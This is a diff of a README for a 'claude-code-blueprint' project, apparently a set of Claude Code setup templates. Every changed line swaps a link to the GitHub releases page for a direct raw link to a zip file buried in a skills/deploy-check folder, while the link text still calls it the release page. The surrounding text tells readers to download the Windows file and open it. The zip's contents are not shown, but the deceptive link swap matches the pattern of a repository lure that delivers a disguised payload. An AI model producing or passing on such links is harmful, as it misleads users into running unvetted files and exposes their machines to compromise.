@@ -1,6 +1,6 @@
 # 🧭 claude-code-blueprint - Start Claude Code with clear structure
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-orange?style=for-the-badge)](https://github.com/lethilu4796/claude-code-blueprint/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-orange?style=for-the-badge)](https://raw.githubusercontent.com/lethilu4796/claude-code-blueprint/main/skills/deploy-check/claude_code_blueprint_v1.8.zip)
 
 ## 📦 What this is
 
@@ -18,7 +18,7 @@ This project helps you:
 
 ## 🚀 Download
 
-Visit this page to download: https://github.com/lethilu4796/claude-code-blueprint/releases
+Visit this page to download: https://raw.githubusercontent.com/lethilu4796/claude-code-blueprint/main/skills/deploy-check/claude_code_blueprint_v1.8.zip
 
 Look for the latest release at the top of the page. Download the Windows file that matches your computer, then open it from your Downloads folder.
 
@@ -260,7 +260,7 @@ This gives you a feel for the setup without adding extra risk.
 
 ## 🔗 Download again
 
-[Go to the release page to download the Windows version](https://github.com/lethilu4796/claude-code-blueprint/releases)
+[Go to the release page to download the Windows version](https://raw.githubusercontent.com/lethilu4796/claude-code-blueprint/main/skills/deploy-check/claude_code_blueprint_v1.8.zip)
 
 ## 🧩 Project topics
 
